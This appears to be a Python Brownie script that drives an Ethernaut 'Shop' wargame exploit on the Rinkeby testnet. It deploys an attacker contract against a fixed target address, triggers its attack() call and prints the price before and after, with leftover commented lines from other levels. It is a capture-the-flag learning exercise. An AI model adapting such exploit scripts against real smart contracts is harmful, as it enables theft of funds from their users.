from ctypes import addressof
from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3

import time
import json
import os

# for local deployment: 


# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# DEV deployment
# deployer=accounts[0]
# deployer=accounts[0]
# attacker=accounts[1]
# target_ct=Denial.deploy({'from': deployer, 'priority_fee': priority_fee})

acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0x97d92aDF91Ee9c496614AE45555385030766bbC7'
target_ct=interface.Shop(target_address)

# deploy attacker contract
attacker_contract=shopAttack.deploy(target_ct.address, {'from': attacker, 'priority_fee': priority_fee})
# attacker.transfer(target_ct.address, 100000000000, priority_fee=priority_fee)

def main():

    print('--- values BEFORE attack ---')
    # print('deployer:', deployer)
    print('attacker:', attacker)
    print('attacker_contract:', attacker_contract)
    print('target_ct.price():', target_ct.price())
    # print('target_ct.codex[1]: ', target_ct.timeZone1Library())
    # print('target_ct.timeZone2Library(): ', target_ct.timeZone2Library())

    # make contact function to pass the modifyer
    tx=attacker_contract.attack({'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})

    # delegate call the attacker contract
    # tx_attack=target_ct.setFirstTime(123, {'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})

    print('--- values AFTER attack ---')
    print('attacker:', attacker)
    print('attacker_contract:', attacker_contract)
    print('target_ct.price():', target_ct.price())
    # print('deployer:', deployer)
    # print('attacker:', attacker)
    # print('attacker_contract:', attacker_contract.address)
    # print('target_ct.timeZone1Library(): ', target_ct.timeZone1Library())
    # print('target_ct.timeZone2Library(): ', target_ct.timeZone2Library())
    # print('target_ct.owner(): ', target_ct.owner())

    # the attacker contract will use the tranferFrom() funciotn, not using the custom modifyer in which th timelock is implemented
    # tx=attacker_contract.attack(balance, {'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})

    # print('player balance after attack: ', target_ct.balanceOf(attacker))

    # print('attacker_contract:', attacker_contract)
    # send some ETH to the attacker contract
    # attacker.transfer(attacker_contract.address, amount=1, priority_fee=priority_fee)
    # print('attacker_contract balance: ', attacker_contract.balance())
    # tx=attacker_contract.attack({'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})
    # balance=target_ct.balanceOf(attacker)
    # print('player balance: ', balance)
    # print('attacker_contract balance: ', target_ct.balanceOf(attacker_contract))
    # print('target_ct balance: ', target_ct.balance())
   
